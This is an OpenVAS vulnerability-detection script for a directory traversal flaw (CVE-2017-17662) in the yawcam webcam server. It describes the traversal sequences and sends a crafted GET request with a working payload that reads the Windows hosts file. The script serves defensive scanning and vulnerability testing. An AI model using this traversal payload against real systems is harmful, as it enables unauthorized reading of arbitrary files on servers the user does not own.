###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_yawcam_dir_trav_vuln.nasl 8709 2018-02-08 06:30:35Z cfischer $
#
# yawcam Directory Traversal Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:yawcam:yawcam';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140684");
  script_version("$Revision: 8709 $");
  script_tag(name: "last_modification", value: "$Date: 2018-02-08 07:30:35 +0100 (Thu, 08 Feb 2018) $");
  script_tag(name: "creation_date", value: "2018-01-15 14:43:14 +0700 (Mon, 15 Jan 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2017-17662");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "VendorFix");

  script_name("yawcam Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_yawcam_detect.nasl");
  script_mandatory_keys("yawcam/installed");

  script_tag(name: "summary", value: "yawcam is pronte to a directory traversal vulnerability.");

  script_tag(name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response.");

  script_tag(name: "insight", value: "Directory traversal in Yawcam allows attackers to read arbitrary files
through a sequence of the form '.x./' or '....\x/' where x is a pattern composed of one or more (zero or more for
the second pattern) of either \ or ..\ -- for example a '.\./', '....\/' or '...\./' sequence.");

  script_tag(name: "affected", value: "yawcam version 0.2.6 through 0.6.0.");

  script_tag(name: "solution", value: "Update to version 0.6.1 or later.");

  script_xref(name: "URL", value: "https://packetstormsecurity.com/files/145770/Yawcam-0.6.0-Directory-Traversal.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/.\./.\./.\./.\./.\./.\./.\./windows/system32/drivers/etc/hosts.";

if (http_vuln_check(port: port, url: url, pattern: "This is a sample HOSTS file", check_header: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
